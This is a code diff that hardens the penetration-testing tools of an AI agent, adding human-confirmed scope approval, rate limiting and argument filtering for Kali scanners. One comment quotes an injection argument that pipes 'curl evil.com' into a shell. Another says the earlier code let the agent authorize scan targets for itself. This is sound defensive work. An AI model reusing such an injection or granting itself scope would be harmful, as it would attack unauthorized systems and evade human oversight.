@@ -28,6 +28,12 @@ import * as path from 'path';
 import * as os from 'os';
 import { readMemory, writeMemory } from './memory.js';
 import { getGlobalSandbox } from './sandbox/index.js';
+// 2026-10-15 P0/P1 修复: 渗透授权/限频/参数安检共用模块 (与 agentai-loop 的 pentest 闸门、
+// routes/pentest-scope.ts 的确认端点同源, 防止三处逻辑漂移)
+import {
+  isTargetInScope, readScope, readScopePending, pentestRateLimit,
+  proposeScope, assertSafeScanArg,
+} from './pentest-scope-guard.js';
 import { WorkspaceManager } from './workspace-manager.js';
 import { ReadTracker } from './tools/read-tracker.js';
 import { currentRequestWorkspace } from './request-scope.js';
@@ -602,7 +608,8 @@ async function gitExec(
 // 2026-10-14 HexStrike P0: scope_guard rate_limit 令牌桶 — 模块级变量, 不能引用
 // 对象字面量里的 key 名 (JS 对象字面量里 key 不在作用域内, 直接写 scope_guard._lastCalls 会
 // ReferenceError)。按 workspace 分桶避免跨工作区串味。
-const _scopeGuardBuckets = new Map<string, number[]>();
+// ⚠️ 2026-10-15 P1-2 修复: 令牌桶已移至 pentest-scope-guard.ts 的 pentestRateLimit(),
+// 与 wsl_scan 共用 —— 原实现只有 AI 主动调 scope_guard 才限频, wsl_scan 内部从不过桶。
 
 const _readTrackers = new Map<string, ReadTracker>();
 
@@ -2569,51 +2576,34 @@ export const EXTRA_HANDLERS: Record<string, ToolHandlerLike> = {
   scope_guard: async (args, ctx) => {
     try {
       const ws = (ctx as any)?.workspace || getWs();
-      const scopeFile = path.join(ws, '.agentai', 'scope.json');
-      // 读 scope.json (不存在 → 保守: 一律拒绝, 不默认放行)
-      let scope: { targets?: string[]; max_rps?: number } = {};
-      if (fs.existsSync(scopeFile)) {
-        scope = JSON.parse(fs.readFileSync(scopeFile, 'utf-8'));
-      }
-      const hostOf = (u: string) => {
-        try { return new URL(u.startsWith('http') ? u : `http://${u}`).hostname.toLowerCase(); }
-        catch { return null; }
-      };
       const action = args.action || 'check_scope';
 
       if (action === 'check_scope') {
-        if (!scope.targets?.length) {
+        const targets = readScope(ws);
+        if (targets.length === 0) {
           return { success: false, output: '❌ 无授权范围 (scope.json 缺 targets)。先创建 .agentai/scope.json: {"targets":["example.com"],"max_rps":5} 后再测。默认拒绝, 不盲目放行。' };
         }
+        const hostOf = (u: string) => {
+          try { return new URL(u.startsWith('http') ? u : `http://${u}`).hostname.toLowerCase(); }
+          catch { return null; }
+        };
         const targetHost = hostOf(String(args.target || ''));
         if (!targetHost) return { success: false, output: `❌ 无法解析目标: ${args.target}` };
-        const allowed = scope.targets.some(t => {
-          const th = hostOf(t);
-          return targetHost === th || targetHost.endsWith('.' + th);
-        });
+        const allowed = isTargetInScope(ws, targetHost);
         return {
           success: true,
           output: allowed
-            ? `✅ in_scope: true — ${targetHost} 在授权范围内 (${scope.targets.length} 个目标), 速率上限 ${scope.max_rps || 5} rps。可继续, 每发一组扫描前调 rate_limit 限频。`
-            : `❌ in_scope: false — ${targetHost} 不在授权范围。范围: ${scope.targets.join(', ')}。禁止越界攻击, 换授权内目标或先补 scope.json。`,
-          data: { in_scope: allowed, target: targetHost, max_rps: scope.max_rps || 5, targets: scope.targets },
+            ? `✅ in_scope: true — ${targetHost} 在授权范围内 (${targets.length} 个目标), 速率上限 ${args.max_rps || 5} rps。可继续, 每发一组扫描前调 rate_limit 限频。`
+            : `❌ in_scope: false — ${targetHost} 不在授权范围。范围: ${targets.join(', ')}。禁止越界攻击, 换授权内目标或先补 scope.json。`,
+          data: { in_scope: allowed, target: targetHost, max_rps: args.max_rps || 5, targets },
         };
       }
 
       if (action === 'rate_limit') {
-        // 令牌桶: 按 max_rps 限频, 打崩目标前闸门 (无 scope.json 时用默认 5 rps)
-        const now = Date.now();
-        const maxRps = scope.max_rps || 5;
-        // 按 workspace 分桶, 避免跨工作区串味
-        const bucket = (_scopeGuardBuckets.get(ws) || [])
-          .filter((t: number) => now - t < 1000);
-        if (bucket.length >= maxRps) {
-          const waitMs = 1000 - (now - bucket[0]);
-          await new Promise(r => setTimeout(r, Math.max(waitMs, 0)));
-          bucket.length = 0;
-        }
-        bucket.push(Date.now());
-        _scopeGuardBuckets.set(ws, bucket);
+        // 令牌桶: 按 max_rps 限频, 打崩目标前闸门 (共用 pentest-scope-guard 的实现,
+        // 与 wsl_scan 内部限频同一个桶 —— 2026-10-15 P1-2 修复)
+        const maxRps = Number(args.max_rps) || 5;
+        await pentestRateLimit(ws, maxRps);
         return { success: true, output: `✅ rate_limit 通过 — 已按 ${maxRps} rps 限频。`, data: { ok: true, max_rps: maxRps } };
       }
 
@@ -2624,6 +2614,18 @@ export const EXTRA_HANDLERS: Record<string, ToolHandlerLike> = {
   report_vulnerability: async (args, ctx) => {
     try {
       const ws = (ctx as any)?.workspace || getWs();
+      // 2026-10-15 P2-1: 证据门槛 — 赏金平台"无证据不过审", 零门槛落盘已被实测污染
+      // (测试残留写进真实 vulns.jsonl)。evidence 必填, status 默认 unverified,
+      // AI 必须显式传 status:'verified' 才标已验证 (需附复现步骤/poc)。
+      const evidence = String(args.evidence || '').trim();
+      if (!evidence) {
+        return {
+          success: false,
+          output: '❌ 拒绝落盘: evidence 为空。赏金平台报告必须可复现 (请求/响应片段、截图路径、复现步骤至少给一项)。补齐后重试。',
+        };
+      }
+      const status = ['unverified', 'verified', 'reported'].includes(String(args.status))
+        ? String(args.status) : 'unverified';
       const vulnsDir = path.join(ws, '.agentai', 'vulns');
       fs.mkdirSync(vulnsDir, { recursive: true });
       const ts = new Date().toISOString().slice(0, 10);
@@ -2632,14 +2634,15 @@ export const EXTRA_HANDLERS: Record<string, ToolHandlerLike> = {
         id, ts: Date.now(),
         title: args.title, target: args.target,
         severity: args.severity, vulnType: args.vulnType || 'unknown',
-        poc: args.poc || '', evidence: args.evidence || '', platform: args.platform || '',
+        poc: args.poc || '', evidence, platform: args.platform || '',
+        status,  // unverified(默认) / verified / reported
       };
       // 追加到 JSONL (与 memory.jsonl 同构, 跨会话可召回)
       const file = path.join(vulnsDir, 'vulns.jsonl');
       fs.appendFileSync(file, JSON.stringify(record) + '\n');
       return {
         success: true,
-        output: `✅ 漏洞已落盘: ${id}\n标题: ${args.title}\n目标: ${args.target} (${args.severity}/${args.vulnType || 'unknown'})\n${args.platform ? `平台: ${args.platform}\n` : ''}路径: ${file}\n下次同类目标可直接召回这条参考。`,
+        output: `✅ 漏洞已落盘: ${id} [${status}]\n标题: ${args.title}\n目标: ${args.target} (${args.severity}/${args.vulnType || 'unknown'})\n${args.platform ? `平台: ${args.platform}\n` : ''}路径: ${file}\n下次同类目标可直接召回这条参考。${status === 'unverified' ? '\n提示: 复现验证通过后可更新为 verified (赏金平台提交需 verified)。' : ''}`,
         data: record,
       };
     } catch (e: any) { return { success: false, output: `report_vulnerability 失败: ${e.message}` }; }
@@ -2647,40 +2650,47 @@ export const EXTRA_HANDLERS: Record<string, ToolHandlerLike> = {
   // ===== 2026-10-15 kali 扫描器接线: wsl_scan 走 WSL kali-linux 调 nmap/nuclei/sqlmap 等 =====
   // 本机 Windows 装不了 Kali 本体, 但 WSL 里有个 kali-linux 发行版。
   // 这里把扫描器白名单固定 (nmap/nuclei/sqlmap/ffuf/gobuster/nikto), 外层先过授权闸门
-  // (同 scope_guard 逻辑), 防止 AI 用它攻击未授权目标。参数经 cmd /c 转 wsl 执行,
-  // 不直接拼进 shell (避免引号注入)。
+  // (同 scope_guard 逻辑), 防止 AI 用它攻击未授权目标。
+  // ⚠️ 2026-10-15 P1-1 注入面修复: 原实现 [tool,...extra,target].join(' ') 拼串后经
+  // `cmd /c wsl -- <串>` 执行 —— `wsl --` 之后由 kali bash 解析, `;|&$` 反引号全部有效,
+  // AI 传 args:["-sV; curl evil.com|sh"] 即可在 kali 执行任意命令 (白名单只锁第一个 token)。
+  // 现在: ① 每参数过 assertSafeScanArg 黑名单; ② execFile argv 数组直调 wsl.exe (不走
+  // cmd /c 少一层 Windows cmd 解析); ③ 执行前过共用令牌桶 (P1-2: 原实现不过限频)。
   wsl_scan: async (args, ctx) => {
     try {
       const { execFile } = await import('child_process');
       const ws = (ctx as any)?.workspace || getWs();
       // 1. 先过授权闸门 (与 scope_guard 同源, 不绕开)
-      const scopeFile = path.join(ws, '.agentai', 'scope.json');
-      let scope: { targets?: string[]; max_rps?: number } = {};
-      if (fs.existsSync(scopeFile)) scope = JSON.parse(fs.readFileSync(scopeFile, 'utf-8'));
       const hostOf = (u: string) => {
         try { return new URL(u.startsWith('http') ? u : `http://${u}`).hostname.toLowerCase(); }
         catch { return null; }
       };
       const targetHost = hostOf(String(args.target || ''));
-      if (!scope.targets?.length || !targetHost) {
-        return { success: false, output: '❌ wsl_scan 需先有 .agentai/scope.json 授权 (targets 非空), 且 target 可解析 host。先调 scope_guard(check_scope) 或 grant_scope。' };
+      if (!isTargetInScope(ws, targetHost || '')) {
+        return { success: false, output: `❌ wsl_scan 需授权: ${targetHost || args.target} 不在 .agentai/scope.json 授权范围 (或无授权文件)。先调 scope_guard(check_scope) 确认, 未授权目标用 grant_scope 提案 (人类确认后生效)。` };
       }
-      const allowed = scope.targets.some(t => { const th = hostOf(t); return targetHost === th || targetHost.endsWith('.' + th); });
-      if (!allowed) return { success: false, output: `❌ wsl_scan 越界: ${targetHost} 不在授权范围 [${scope.targets.join(', ')}]。禁止攻击未授权目标。` };
       // 2. 工具白名单 (防任意命令注入, 只许这 6 个扫描器)
       const tool = String(args.tool || 'nmap');
       const ALLOWED = new Set(['nmap', 'nuclei', 'sqlmap', 'ffuf', 'gobuster', 'nikto']);
-      if (!ALLOWED.has(tool)) return { success: false, output: `❌ 未知工具: ${tool} (允许: ${[...ALLOWED].join('/').split(',').map(s=>s.trim()).join(' / ')})` };
-      // 3. 组装: wsl -d kali-linux -- <tool> <args> <target>
+      if (!ALLOWED.has(tool)) return { success: false, output: `❌ 未知工具: ${tool} (允许: ${[...ALLOWED].join(' / ')})` };
+      // 3. 参数级安检 (2026-10-15 P1-1): 每个参数独立过 shell 元字符黑名单
       const extra = Array.isArray(args.args)
         ? args.args.map((x: any) => String(x)).slice(0, 32)
         : String(args.args || '').split(' ').filter(Boolean).slice(0, 32);
-      const innerCmd = [tool, ...extra, targetHost].join(' ');
+      try {
+        assertSafeScanArg(tool);
+        for (const a of extra) assertSafeScanArg(a);
+        assertSafeScanArg(targetHost!);
+      } catch (e: any) {
+        return { success: false, output: e.message };
+      }
+      // 4. 限频 (P1-2): 与 scope_guard rate_limit 共用令牌桶, 防连发真实扫描打崩目标
+      await pentestRateLimit(ws, Number(args.max_rps) || 3);
+      // 5. argv 数组直调 wsl.exe (不走 cmd /c, 少一层 shell 解析; 数组化 + 黑名单双保险)
+      const argv = ['-d', 'kali-linux', '--', tool, ...extra, targetHost!];
       const timeoutMs = Math.min(Number(args.timeout_ms) || 60_000, 180_000);
-      // 经 cmd /c 转义执行 (避免 bash 直连 wsl 时引号被吃), 参数经 argv 数组不走 shell 拼接
-      const wslCmd = `wsl -d kali-linux -- ${innerCmd.replace(/"/g, '\\"')}`;
       const out = await new Promise<string>((resolve, reject) => {
-        execFile('cmd', ['/d', '/s', '/c', wslCmd], {
+        execFile('wsl', argv, {
           timeout: timeoutMs + 5000, maxBuffer: 5 * 1024 * 1024,
           windowsHide: true, encoding: 'utf-8',
         }, (err: any, so: any, se: any) => {
@@ -2697,48 +2707,61 @@ export const EXTRA_HANDLERS: Record<string, ToolHandlerLike> = {
     }
   },
   // ===== 2026-10-15 授权对话化: grant_scope / list_scope (免手写 scope.json) =====
+  // ⚠️ 2026-10-15 P0-2 修复: grant_scope 原实现**直接写 scope.json** —— pentest 子智能体
+  // 可以自我授权任意目标再扫描 (白帽工具与攻击框架的分界线失守)。现改为提案制:
+  // AI 只能写 scope-pending.json, 人类在授权面板 (ScopeManager) 点确认后才进 scope.json。
   grant_scope: async (args, ctx) => {
     try {
       const ws = (ctx as any)?.workspace || getWs();
-      const scopeFile = path.join(ws, '.agentai', 'scope.json');
-      // 读现有 (不存在则空)
-      let scope: { targets?: string[]; max_rps?: number } = {};
-      if (fs.existsSync(scopeFile)) {
-        try { scope = JSON.parse(fs.readFileSync(scopeFile, 'utf-8')); } catch { scope = {}; }
-      }
-      if (!Array.isArray(scope.targets)) scope.targets = [];
       const hostOf = (u: string) => {
         try { return new URL(u.startsWith('http') ? u : `http://${u}`).hostname.toLowerCase(); }
         catch { return null; }
       };
-      const host = hostOf(String(args.target || ''));
+      // 通配符目标 (如 *.bestpay.com.cn) 不走 URL 解析 (hostname 会把 * 当非法字符),
+      // 直接保留原文小写。精确 host / URL 照旧抽 hostname。
+      const rawTarget = String(args.target || '').trim();
+      const isWildcard = rawTarget.startsWith('*.');
+      const host = isWildcard ? rawTarget.toLowerCase() : hostOf(rawTarget);
       if (!host) return { success: false, output: `❌ 无法解析目标 host: ${args.target}` };
-      // 去重追加
-      const already = scope.targets.some(t => { const th = hostOf(t); return th === host; });
-      if (!already) scope.targets.push(host);
-      if (args.max_rps) scope.max_rps = Number(args.max_rps);
-      fs.mkdirSync(path.dirname(scopeFile), { recursive: true });
-      fs.writeFileSync(scopeFile, JSON.stringify(scope, null, 2), 'utf-8');
+      const r = proposeScope(ws, host, 'agent');
+      if (r.already === 'in_scope') {
+        return {
+          success: true,
+          output: `ℹ️ ${host} 已在授权范围内, 无需重复授权。可继续 (scope_guard / wsl_scan / pentest 子智能体均可动手)。`,
+          data: { granted: false, already: 'in_scope', target: host },
+        };
+      }
+      if (r.already === 'pending') {
+        return {
+          success: true,
+          output: `ℹ️ ${host} 的授权提案已存在, 仍在等待人类确认。请用户在左侧「渗透测试授权」面板确认后, 再调 list_scope 查看生效结果。`,
+          data: { granted: false, already: 'pending', target: host },
+        };
+      }
       return {
         success: true,
-        output: `${already ? '（已在授权范围, 未重复添加）' : '✅ 已授权'} ${host} — 现共 ${scope.targets.length} 个目标, max_rps=${scope.max_rps || 5}。后续 scope_guard / wsl_scan / pentest 子智能体可对该目标动手。`,
-        data: { granted: !already, target: host, targets: scope.targets, max_rps: scope.max_rps || 5, file: scopeFile },
+        output: `📨 已向用户发起授权提案: ${host} (等待人类确认, 未生效)。\n请用户在左侧「渗透测试授权」面板 (或 /scope 弹窗) 点「确认授权」。确认后调 list_scope 可查, 之后 scope_guard / wsl_scan / pentest 子智能体才能对该目标动手。`,
+        data: { granted: false, pending: true, target: host },
       };
     } catch (e: any) { return { success: false, output: `grant_scope 失败: ${e.message}` }; }
   },
   list_scope: async (_args, ctx) => {
     try {
       const ws = (ctx as any)?.workspace || getWs();
-      const scopeFile = path.join(ws, '.agentai', 'scope.json');
-      if (!fs.existsSync(scopeFile)) {
-        return { success: true, output: '📭 当前无授权范围 (.agentai/scope.json 不存在)。要挖洞先用 grant_scope 授权一个目标。', data: { targets: [], max_rps: 0 } };
+      const targets = readScope(ws);
+      const pending = readScopePending(ws);
+      const lines = [
+        targets.length
+          ? `🔓 当前授权范围: ${targets.join(', ')}。共 ${targets.length} 个目标。`
+          : '📭 当前无授权范围 (.agentai/scope.json 不存在或为空)。要挖洞先用 grant_scope 提案一个目标 (需人类确认)。',
+      ];
+      if (pending.length > 0) {
+        lines.push(`⏳ 等待人类确认的提案 ${pending.length} 条: ${pending.map(p => p.target).join(', ')} (在授权面板确认后生效)`);
       }
-      const scope = JSON.parse(fs.readFileSync(scopeFile, 'utf-8'));
-      const targets = Array.isArray(scope.targets) ? scope.targets : [];
       return {
         success: true,
-        output: `🔓 当前授权范围: ${targets.length ? targets.join(', ') : '(空)'} | max_rps=${scope.max_rps || 5}。共 ${targets.length} 个目标。`,
-        data: { targets, max_rps: scope.max_rps || 5, file: scopeFile },
+        output: lines.join('\n'),
+        data: { targets, pending, max_rps: 5 },
       };
     } catch (e: any) { return { success: false, output: `list_scope 失败: ${e.message}` }; }
   },
